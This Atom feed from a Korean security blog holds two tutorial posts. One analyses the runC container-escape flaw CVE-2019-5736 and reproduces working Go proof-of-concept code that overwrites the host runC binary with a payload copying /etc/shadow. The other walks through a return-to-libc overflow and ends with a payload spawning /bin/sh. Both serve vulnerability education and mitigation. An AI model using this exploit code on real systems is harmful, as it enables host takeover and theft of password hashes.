<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
  <link href="/author/Sulla/feed.xml" rel="self" type="application/atom+xml" />
  <link href="/" rel="alternate" type="text/html" />
  <updated>2019-03-27T21:42:44+09:00</updated>
  <id>/author/Sulla/feed.xml</id>

  
  
  

  
    <title type="html">LIN ARENA | </title>
  

  
    <subtitle>LIN ARENA Technology Blog</subtitle>
  

  

  
    
      
    
      
    
      
    
      
    
      
    
  

  
  

  
    <entry>
      <title type="html">CVE-2019-5736 (runC Container 취약점)</title>
      <link href="/runC-Container" rel="alternate" type="text/html" title="CVE-2019-5736 (runC Container 취약점)" />
      <published>2019-03-28T02:43:00+09:00</published>
      <updated>2019-03-28T02:43:00+09:00</updated>
      <id>/runC%20Container</id>
      <content type="html" xml:base="/runC-Container">&lt;h2 id=&quot;cve-2019-5736-runc-container-취약점&quot;&gt;CVE-2019-5736 (runC Container 취약점)&lt;/h2&gt;

&lt;p&gt;안녕하세요. Sulla임돠!&lt;/p&gt;

&lt;p&gt;2월 11일 &lt;strong&gt;docker&lt;/strong&gt;관련 런타임인 &lt;strong&gt;runC&lt;/strong&gt; 관련 취약점 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 공개 되었습니다. 
공개된지 1주일도 안지나 &lt;strong&gt;POC&lt;/strong&gt;가 공개되고 있으며, 영향력도 큰 취약점으로 많은 주목을 받고있습니다.&lt;/p&gt;

&lt;p&gt;그래서 이번 포스팅에서는 해당 취약점에 대하여 리뷰해 보겠습니다.&lt;/p&gt;

&lt;h2 id=&quot;본-포스팅에서는-환경-구축버전-등의-정보는-제외하겠습니다&quot;&gt;[&lt;strong&gt;본 포스팅에서는 환경 구축/버전 등의 정보는 제외하겠습니다.]&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;먼저 &lt;strong&gt;docker&lt;/strong&gt;가 뭔지…&lt;strong&gt;runC&lt;/strong&gt;가 뭔지에 대해서 알아야겠죠??언제나 그렇듯 최대한 간단하고 필요한 내용만 쉽게 알아보겠습니다.(&lt;strong&gt;귀차니즘&lt;/strong&gt; 아닙니다…..)&lt;/p&gt;

&lt;p&gt;우선 &lt;strong&gt;docker&lt;/strong&gt;란 &lt;strong&gt;Linux&lt;/strong&gt; 기반의 &lt;strong&gt;container runtime 오픈소스 플랫폼&lt;/strong&gt; 입니다. 쉽게 말해 &lt;strong&gt;Container 관리 플랫폼&lt;/strong&gt;이며, &lt;strong&gt;VM&lt;/strong&gt;(Virtual Machine)과 비슷한 역할을 수행하지만 쉬운 배포 및 높은 확장성 등의 &lt;strong&gt;접근성&lt;/strong&gt;과 메모리 점유등의 &lt;strong&gt;성능&lt;/strong&gt;의 차이를 보입니다.(“&lt;strong&gt;가상화&lt;/strong&gt;“가 목표이긴 합니다.)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-1.png&quot; alt=&quot;[그림 5736-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Docker의 기본 구성을 위 그림과 같이 표현했습니다. 각각의 역할을 알아 보겠습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Docker Engine : 사용자와 상호작용을 합니다.&lt;/li&gt;
  &lt;li&gt;Containerd : 직/간접적으로 호스트에서 컨테이너 전체 라이프 사이클을 관리합니다. (이미저 전송 및 저장, 컨테이너 실행 및 관리(runC 사용), 네트워크 인터페이스 관리 등)&lt;/li&gt;
  &lt;li&gt;Containerd-shim : runC를 사용해 컨테이너를 시작된 후에 runC가 종료 되어도 컨테이너가 실행 되도록합니다.&lt;/li&gt;
  &lt;li&gt;runC : 컨테이너를 실행하는 런타임이며, CLI 툴 입니다. (리눅스 커널 네임스페이스, Cgroups(프로세스의 자원 사용을 제한하는 커널 기능), Seccomp(리눅스 커널에서 샌드 박싱 메커니즘을 제공하는 보안 기능), 리눅스 보안 모듈 등)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;기본 구성 및 역할에 대하여 알아봤고 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약점에 직접적인 영향을 미치는 runC에 대해서 알아 보겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;runC&lt;/strong&gt;는 &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;생성/실행&lt;/strong&gt; 등을 위한 기본적인 기술이며 &lt;strong&gt;CLI&lt;/strong&gt; 도구입니다. 즉, &lt;strong&gt;container&lt;/strong&gt;의 &lt;strong&gt;조작&lt;/strong&gt;을 위해 존재 한다고 생각하면 될 것 같습니다. &lt;strong&gt;runC&lt;/strong&gt;는 Docker, containerd, Podman 및 CRI-O가있는 &lt;strong&gt;컨테이너의 기본 런타임&lt;/strong&gt;으로 사용됩니다.&lt;/p&gt;

&lt;p&gt;그럼 이번 포스팅의 주인공인 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt;에 대해서 알아보겠습니다.&lt;/p&gt;

&lt;h1 id=&quot;cve-2019-5736&quot;&gt;CVE-2019-5736&lt;/h1&gt;

&lt;p&gt;해당 취약점은 위에서 알아본 &lt;strong&gt;runC&lt;/strong&gt;에서 발생하는 취약점입니다. &lt;strong&gt;**컨테이너 내부에서 **루트 권한&lt;/strong&gt;으로 악의적인 프로세스를 실행할 경우 &lt;strong&gt;runC 버그&lt;/strong&gt;를 이용하여 컨테이터를 실행하는 &lt;strong&gt;호스트에 대한 루트 권한&lt;/strong&gt;을 탈취하는 취약점입니다. 따라서, 서버에 대한 접근 및 해당 서버의 다른 컨테이너 또한 접근이 가능합니다.&lt;/p&gt;

&lt;p&gt;쉽게 말해 &lt;strong&gt;악성 컨테이너&lt;/strong&gt;를 통해 &lt;strong&gt;호스트 서버의 루트 권한 탈취&lt;/strong&gt;가 가능하게 됩니다.&lt;/p&gt;

&lt;p&gt;해당 취약점의 트리거 방법은 다음중 하나 입니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;컨테이너 내부의 악성 프로세스 실행(루트로 실행되는 )&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;악성 docker 이미지를 실행&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;해당 취약점을 트리거 하기 위해서는 위에서도 언급했 듯 &lt;strong&gt;컨테이너 내부&lt;/strong&gt;에 &lt;strong&gt;루트 권한&lt;/strong&gt;이 있어야 합니다.&lt;/p&gt;

&lt;p&gt;화면 구성은 위쪽은 &lt;strong&gt;Host Server&lt;/strong&gt;, 아래쪽은 &lt;strong&gt;Container&lt;/strong&gt; 입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-2.png&quot; alt=&quot;[그림 5736-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;진행 자체는 굉장히 간단하게 진행됩니다.(물론 저는 삽질 했습니다……Aㅏ…..) 먼저 &lt;strong&gt;Host Server&lt;/strong&gt;쪽에 해당 파일이 없음을 확인 합니다. 후에는 컨테이너에서 악성 파일을 실행하면 준비가 끝납니다. 함정 처럼 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt; 바꿔놓고 기다리는 단계입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-3.png&quot; alt=&quot;[그림 5736-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그리고 호스트가 컨테이너쪽으로  &lt;strong&gt;docker exec&lt;/strong&gt; 명령을 통해 &lt;strong&gt;/bin/sh&lt;/strong&gt;의 실행을 명하게 되면 위에서 설치해뒀던 함정이 발동하게 됩니다. 함정 카드….. &lt;strong&gt;(/bin/sh를 쓸것이라 추측하고 세팅 하는겁니다.)&lt;/strong&gt; 
다음으로 &lt;strong&gt;runC&lt;/strong&gt;의 &lt;strong&gt;PID&lt;/strong&gt;를 찾고 &lt;strong&gt;핸들링(O_PATH ,O_WRONLY 플래그 사용)&lt;/strong&gt;을 위한 여러 과정을 거치고 최종적으로 호스트의 &lt;strong&gt;runC&lt;/strong&gt; 바이너리 파일을 &lt;strong&gt;악성 runC&lt;/strong&gt; 로 변조되며 악성 파일에 미리 정의 되있던 행위를 &lt;strong&gt;호스트&lt;/strong&gt;쪽에서 &lt;strong&gt;루트 권한&lt;/strong&gt;으로 수행하게 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-4.png&quot; alt=&quot;[그림 5736-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;처음에는 없던 shadow 파일이 root 권한으로 생성된 것을 확인할 수 있습니다. 해당파일을 열람시 실제 shadow 파일임을 확인 가능합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-5.png&quot; alt=&quot;[그림 5736-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 과정을 거치면서 &lt;strong&gt;Host Server&lt;/strong&gt;쪽의 runC 파일이 변조됩니다. 해쉬값을 비교하면 쉽게 확인 가능하며 위쪽 해쉬값이 원본이면 아래쪽은 변조된 runC 바이너리의 해쉬값입니다.&lt;/p&gt;

&lt;p&gt;두 번째 방법의 경우는 첫 번쨰와 원리는 같으며 차이점은 악성 docker 이미지를 생성해서 배포하고 피해자는 해당 이미지를 다운받아 실행하게 되면 위에서와 같은 일련의 동작들을 수행하게 됩니다.&lt;/p&gt;

&lt;p&gt;보신것처럼 &lt;strong&gt;Container&lt;/strong&gt; 쪽에서 &lt;strong&gt;Host Server&lt;/strong&gt;의 &lt;strong&gt;root&lt;/strong&gt; 권한으로 악의적인 행위가 가능한 취약점입니다.&lt;/p&gt;

&lt;p&gt;어쩌다 이런 일이 생기는지 코드를 보면서 확인 해보겠습니다. (해당 poc코드는 go로 작성 되었습니다.)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var payload = &quot;#!/bin/bash \n cat /etc/shadow &amp;gt; /tmp/shadow &amp;amp;&amp;amp; chmod 777 /tmp/shadow&quot;

func main() {
	fd, err := os.Create(&quot;/bin/sh&quot;)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;)
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;우선 &lt;strong&gt;Container&lt;/strong&gt;에서 악성 프로세스를 실행하게 되면 위 코드가 실행됩니다.&lt;/p&gt;

&lt;p&gt;1라인의 행위를 위해 아래의 코드들이 쭉 진행됩니다.&lt;/p&gt;

&lt;p&gt;코드의 4라인에서 /bin/sh 를 생성 하고 fd에 저장 합니다. 다음으로 9라인에서 #!/proc/self/exe를 fd에 저장 합니다. Fprintln()함수는 첫 번째 인자에 두 번째 인자를 전달하는 기능을 수행 합니다. 첫 번째 인자인 fd는 /bin/sh이며 여기에 /proc/self/exe가 저장 되겠죠.&lt;/p&gt;

&lt;p&gt;위 코드의 동작을 해석 하자면 9라인의 &lt;strong&gt;#!/proc/self/exe(&lt;/strong&gt;해당 프로세스를 위해 실행된 바이너리를 가리키는 모든 프로세스에 대한 &lt;strong&gt;커널&lt;/strong&gt;이 만든 &lt;strong&gt;심볼릭 링크&lt;/strong&gt;입니다.&lt;strong&gt;)&lt;/strong&gt;는 현재 실행된 프로세스를 어떤놈이 실행 시켰는지에 대해 가리킵니다. 현재 실행된 프로세스는 Host에 의해서 실행된 /bin/sh 이죠. 따라서 /bin/sh을 실행 시킨놈은 Host의 &lt;strong&gt;runC&lt;/strong&gt;입니다.
다시 정리 해본다면, Host에서 Container의 /bin/sh을 &lt;strong&gt;docker exec&lt;/strong&gt;를 통해 실행 하는데 이 때 &lt;strong&gt;runC&lt;/strong&gt;가 사용 됩니다. 결국 &lt;strong&gt;#!/proc/self/exe&lt;/strong&gt;가 가리키는 놈은 &lt;strong&gt;Host의 runC&lt;/strong&gt;가 되고 &lt;strong&gt;/bin/sh&lt;/strong&gt;는 결국 Host의 &lt;strong&gt;runC&lt;/strong&gt;가 됩니다.
여기가 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약점의 주요 원인이라 판단이 됩니다. &lt;strong&gt;/proc/self/exe&lt;/strong&gt;가 가리키는 것에 대해서 &lt;strong&gt;부적절하게 처리함&lt;/strong&gt;으로서 위와 같은 행위가 가능해 지는것이죠.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var found int
	for found == 0 {
		pids, err := ioutil.ReadDir(&quot;/proc&quot;)
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;)
			fstring := string(fbytes)
			if strings.Contains(fstring, &quot;runc&quot;) {
				fmt.Println(&quot;[+] Found the PID:&quot;, f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;다음 코드에서는 runC가 구동 되는 동안 runC를 덮어쓸 수 없기 때문에 이를 해결 하기위한 코드가 짜여져 있는데 이 때 필요한 &lt;strong&gt;runC의 PID를 찾기위한 코드&lt;/strong&gt;입니다. /proc/[PID]/cmdline(해당 PID를 갖는 프로세스가 어떤 command로 실행 되었는지를 나타냅니다.)에 있는 모든 파일에서 runC를 찾고 결과적으로 runC의 PID를 확보 합니다.
즉, 모든 PID를 대상으로 어떤 친구가 runC를 실행 했는지 찾아 내는 과정입니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var handleFd = -1
	for handleFd == -1 {
		handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777)
		if int(handle.Fd()) &amp;gt; 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println(&quot;[+] Successfully got the file handle&quot;)

	for {
		writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) &amp;gt; 0 {
			fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle)
			writeHandle.Write([]byte(payload))
			return
		}
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;다음 코드에서는 위에서 찾아낸 runC의 PID값을 이용해 파일 핸들을 얻어냅니다. 이 핸들을 이용해 &lt;strong&gt;/proc/self/fd/파일 서술자&lt;/strong&gt;의 &lt;strong&gt;파일 핸들&lt;/strong&gt;을 얻습니다. 해당 파일 핸들을 유지하며 Host의 runC를 악성 runC로 바꾸는 등의 권한을 얻게 됩니다.&lt;/p&gt;

&lt;p&gt;위에서의 과정에서 보이듯 &lt;strong&gt;rudC&lt;/strong&gt;의 &lt;strong&gt;파일 서술자(/proc/self/exe)&lt;/strong&gt;에 대한 처리 미흡으로 권한 상승이 가능해지는 취약점입니다.&lt;/p&gt;

&lt;h1 id=&quot;대응-방법&quot;&gt;대응 방법&lt;/h1&gt;

&lt;p&gt;취약점의 동작 조건중 하나는 &lt;strong&gt;Container&lt;/strong&gt;에의 &lt;strong&gt;root&lt;/strong&gt;권한이 있어야 합니다. 또한 &lt;strong&gt;출처를 알 수 없는 이미지&lt;/strong&gt;를 무분별하게 사용시에도 공격 시나리오가 생길것입니다. 
전부는 아니지만 대부분의 Cloud Container system이 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약할 것 입니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Container root 권한 제한&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;신뢰할 수 없는 이미지 파일 사용 자제&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;runC 등 최신 버전 유지&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;컨테이너 시작 시 호출되는 바이너리의 임시 백업 바이너리 생성&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;…….&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;해당 취약점에 영향을 받는 여러 업체들(Red Hat, runC 관리자, google, Amazon, Docker, debian, ubuntn 등등)은 취약 runC 버전에 대해서 업데이트 한 이미지를 배포중입니다.&lt;/p&gt;

&lt;p&gt;영어 해석에 재능이 부족하여 틀린 내용이 있다면 알려주시기 바랍니다 :)&lt;/p&gt;

&lt;p&gt;감사합니다.&lt;/p&gt;

&lt;h2 id=&quot;references-참고-문헌&quot;&gt;References 참고 문헌&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html&lt;/li&gt;
  &lt;li&gt;https://brauner.github.io/2019/02/12/privileged-containers.html&lt;/li&gt;
  &lt;li&gt;https://www.helpnetsecurity.com/2019/02/12/runc-container-escape-flaw/&lt;/li&gt;
  &lt;li&gt;https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/&lt;/li&gt;
  &lt;li&gt;https://vulmon.com/exploitdetails?qidtp=EDB&amp;amp;qid=46369&lt;/li&gt;
  &lt;li&gt;https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d&lt;/li&gt;
  &lt;li&gt;https://github.com/rancher/runc-cve&lt;/li&gt;
  &lt;li&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/li&gt;
  &lt;li&gt;https://subicura.com/2017/01/19/docker-guide-for-beginners-1.html&lt;/li&gt;
&lt;/ul&gt;</content>

      
      
      
      
      

      <author>
          <name>Sulla</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">CVE-2019-5736 (runC Container 취약점)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">linux_0x04</title>
      <link href="/linux_0x04" rel="alternate" type="text/html" title="linux_0x04" />
      <published>2019-03-24T15:18:00+09:00</published>
      <updated>2019-03-24T15:18:00+09:00</updated>
      <id>/linux_0x04</id>
      <content type="html" xml:base="/linux_0x04">&lt;h2 id=&quot;rtlreturn-to-library&quot;&gt;RTL(Return to Library)&lt;/h2&gt;

&lt;p&gt;안녕하세요. &lt;strong&gt;Sulla&lt;/strong&gt;입니다!&lt;/p&gt;

&lt;p&gt;이번에 알아볼 내용은 &lt;strong&gt;RTL&lt;/strong&gt;(Return to Library)입니다.
먼저 &lt;strong&gt;RTL&lt;/strong&gt;이 뭔지를 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h1 id=&quot;rtlreturn-to-library-1&quot;&gt;RTL(Return to Library)&lt;/h1&gt;

&lt;p&gt;지난 포스팅에서 &lt;strong&gt;메모리 보호 기법&lt;/strong&gt;에 대해 간단하게 봤습니다. 그 중 &lt;strong&gt;ASLR&lt;/strong&gt;은 봤고 &lt;strong&gt;DEP/NX bit&lt;/strong&gt;는 언급만 하고 넘어갔었죠. &lt;strong&gt;메모리 내부에서 코드실행을 방지&lt;/strong&gt;하기 위한 메모리 보호 기법 중 하나라고 알려 드렸습니다.&lt;/p&gt;

&lt;p&gt;메모리에서의 코드 실행이 막혔기 때문에(Shellcode 실행 차단) 다른 방법을 찾아야 합니다. &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 직접 실행할 수 있다면 가능할 듯 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-1.png&quot; alt=&quot;[그림 4-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그럼 어떻게 해야할까요? 첫 포스팅에서 메모리 구조를 설명 드릴 때 위 그림을 보여 드렸었습니다.&lt;strong&gt;[스택 -&lt;/strong&gt; &lt;strong&gt;공유라이브러리 -&lt;/strong&gt; &lt;strong&gt;힙 - BSS/Data - Code]&lt;/strong&gt;으로 이뤄지며, 공유 라이브러리는 &lt;strong&gt;메모리에 미리 필요한 중요 함수들을 저장해두는 장소&lt;/strong&gt;라고 간단하게 설명 드렸었죠.
저 &lt;strong&gt;공유 라이브러리&lt;/strong&gt;를 사용하여 &lt;strong&gt;/bin/sh&lt;/strong&gt;을 실행할 수 있지 않을까???라는 생각으로 &lt;strong&gt;RTL&lt;/strong&gt;이 연구되었다 생각되네요….(&lt;strong&gt;뇌피셜)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;공유 라이버르러리를 간단하게 정리하자면 다음과 같습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;여러 프로세스에서 동시에 사용 가능한 라이브러리&lt;/li&gt;
  &lt;li&gt;프로그램이 시작될 때 메모리에 적재됨&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;우리는 저 &lt;strong&gt;공유 라이브러리&lt;/strong&gt; 중에서 &lt;strong&gt;system()&lt;/strong&gt; 함수를 사용하겠습니다. 해당 함수는 입력받은 문자열을 실행시키는 함수입니다. 즉, 인자값으로 &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 입력한다면 &lt;strong&gt;system(“/bin/sh”);&lt;/strong&gt;과 같은 형태가 되며 &lt;strong&gt;system()&lt;/strong&gt;이 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 실행하게 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-2.png&quot; alt=&quot;[그림 4-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;RTL&lt;/strong&gt;의 흐름을 위와 같이 표현했습니다. &lt;strong&gt;libc&lt;/strong&gt;(공유라이브러리)의 함수(&lt;strong&gt;system()&lt;/strong&gt;)를 사용해서 &lt;strong&gt;8byte&lt;/strong&gt; 뒤에 &lt;strong&gt;/bin/sh&lt;/strong&gt; 의 주소를 박아두면 &lt;strong&gt;system()&lt;/strong&gt;이 &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 실행하여 &lt;strong&gt;shell&lt;/strong&gt;을 따내게 됩니다. 
즉, &lt;strong&gt;버퍼 + sfp + system() + AAAA + /bin/sh&lt;/strong&gt; 처럼 표현 가능할 듯 합니다.&lt;/p&gt;

&lt;p&gt;여기서 왜 &lt;strong&gt;system()&lt;/strong&gt; 뒤에 인자값으로 바로 &lt;strong&gt;/bin/sh/&lt;/strong&gt;가 아닌 잉여값 “&lt;strong&gt;AAAA&lt;/strong&gt;“을 입력할까요? 그냥 바로 인자값을 입력하면 인식을 못할까요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-3.png&quot; alt=&quot;[그림 4-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;system(“/bin/sh”)&lt;/strong&gt; 이 입력된 상태에서 함수가 종료되면 에필로그 과정을 가집니다. 에필로그 과정 중 ret(pop eip) 과정을 거치며 system() 함수의 주소를 eip에  옮기게 되죠. 이 과정에 pop 명령을 사용 했기에 스택에 공간이 생깁니다.(가운데) 그런 다음 system() 함수의 프롤로그 과정을 가지며 push ebp, mov ebp, esp 과정을 거치며 새롭게 메모리의 영역을 확보하죠. 
즉, AAAA의 위치는 system 함수가 끝난 뒤의 ret 구역이 되며 잉여값을 배치해주고, 다음 공간에 원하는 주소값을 위치시켜 줍니다. 좀더 확실하게 알아보도록 하죠. (참고로 root로 생성된 실행파일은 디버깅이 안되니 /tmp/ 하위에 다른 폴더로 복사해서 분석해주세요!!)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-4.png&quot; alt=&quot;[그림 4-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 사진에서와 같이 system() 내부를 들여다 보면 프로로그 과정을 거치고 EBP에서 8byte 떨어진 주소를 참조합니다. EBP에서 4byte를 가지고 우리는 남은 4byte만(RET) 채워준 뒤 원하는 주소를 입력해준다면 인자값을 정상적으로 인식하게 됩니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Return to Library&lt;/strong&gt;라는 이름을 아주 성실하게 이행하는 모습이네요. 그럼 직접 시작해보곘습니다. 먼저 찾아야 할 주소는 아래와 같습니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = ????&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = ????&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;1번 system 주소부터 확인 하도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-5.png&quot; alt=&quot;[그림 4-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저 브레이크를 main 함수에 잡아주고 구동 시킵니다.bp에 멈추고 나면 print 명령을 사용해 system()의 주소를 확인 하시면 됩니다.(system의 주소를 못 찾는 심볼을 찾을수 없다는 에러가 뜨는 경우 static 옵션을 뺴고 컴파일 해주세요….개고생 했습니다…..)&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = &lt;strong&gt;0x4203f2c0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = ????&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이제 /bin/sh의 주소를 구해야 합니다. 실제로는 /lib/libc.so.6 라이브러리 파일 내의 /bin/sh와 system 의 오프셋을 구해서 최종적인 문자열 주소를 찾을수 있지만 아래의 반복문을 통해서 쉽게 구해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01 #include &amp;lt;stdio.h&amp;gt;
02 
03 int main(){
04   long shell=0x4203f2c0; //system()의 주소를 입력해 주시면 됩니다.
05 	 while(memcmp((void*)shell,(&quot;/bin/sh&quot;),8))
06   shell++; 
07 	 printf(&quot;%p\n&quot;,shell);
08 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;코드의 중요 라인인 5라인만 설명 드리자면 &lt;strong&gt;memcmp&lt;/strong&gt; 함수를 사용해서 &lt;strong&gt;바이트 데이터를 비교&lt;/strong&gt; 하는 과정입니다. &lt;strong&gt;memcmp(인자1, 인자2, 사이즈)&lt;/strong&gt;의 기본형을 가지며 &lt;strong&gt;인자 1&lt;/strong&gt;의 첫 바이트와 &lt;strong&gt;인자 2&lt;/strong&gt;의 첫 바이트를 &lt;strong&gt;사이즈&lt;/strong&gt; 만큼 비교하는 것이며, 이 과정을 통해서 &lt;strong&gt;system()내부에 /bin/sh 문자열을&lt;/strong&gt; 찾아내며 결과적으로 &lt;strong&gt;주소값으로 리턴&lt;/strong&gt; 해줍니다. 돌려줍시다~&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-6.png&quot; alt=&quot;[그림 4-6]&quot; /&gt;
&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = &lt;strong&gt;0x4203f2c0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = &lt;strong&gt;0x42127ea4&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;최종적으로 system() 과 /bin/sh 의 주소값을 찾아냈습니다. 이제 찾아낸 정보를 바탕으로 공격 페이로드를 작성해 보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 `python -c 'print &quot;AAAA&quot;*11 + &quot;\xc0\xf2\x03\x42&quot; + &quot;AAAA&quot; + &quot;\xa4\x7e\x12\x42&quot;'`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;마지막으로 페이로드를 정리 하고 직접 때려보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-7.png&quot; alt=&quot;[그림 4-7]&quot; /&gt;
&lt;/figure&gt;

